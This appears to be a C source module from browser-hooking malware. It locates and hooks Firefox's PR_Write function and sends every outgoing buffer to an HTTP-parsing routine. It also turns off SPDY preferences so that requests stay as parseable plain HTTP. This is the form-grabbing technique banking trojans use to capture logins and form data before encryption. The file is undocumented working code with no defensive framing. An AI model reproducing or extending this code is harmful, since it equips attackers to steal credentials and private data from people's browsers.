#include <Windows.h>
#include "Firefox.h"
#include "Firefox Scanner.h"
#include "Hook Engine.h"
#include "HTTP Parse.h"
#include "Main.h"

PPR_WRITE PR_WRITE = 0;
PSETBOOL SETBOOL = 0;
FIREFOXMETHODS sFIREFOXMETHODS;


DWORD FIREFOXCALLBACK(void*fd, const void *buf,int amount)
{
	int dwError = PR_WRITE(fd,buf,amount);
	if (dwError == amount)
	{
		ProcessHeader((char*)buf,amount,"Firefox",NULL,0, "PR_WRITE");
	}
	return dwError;
}

VOID FirefoxEntry()
{
	RtlSecureZeroMemory(&sFIREFOXMETHODS, sizeof(sFIREFOXMETHODS));
	sFIREFOXMETHODS.PR_WRITE = FindPRWrite();
	sFIREFOXMETHODS.SetBoolPref = FindPrefFunction();

	if (sFIREFOXMETHODS.PR_WRITE)
	{
		PR_WRITE = (PPR_WRITE)sFIREFOXMETHODS.PR_WRITE;
		PR_WRITE = (PPR_WRITE)SetHook(FIREFOXCALLBACK, PR_WRITE);
	}

	if (sFIREFOXMETHODS.SetBoolPref)
	{
		SETBOOL = (PSETBOOL)sFIREFOXMETHODS.SetBoolPref;
		SETBOOL("network.http.spdy.enabled.v3-1", FALSE);
		SETBOOL("network.http.spdy.enabled",FALSE);	
	}

}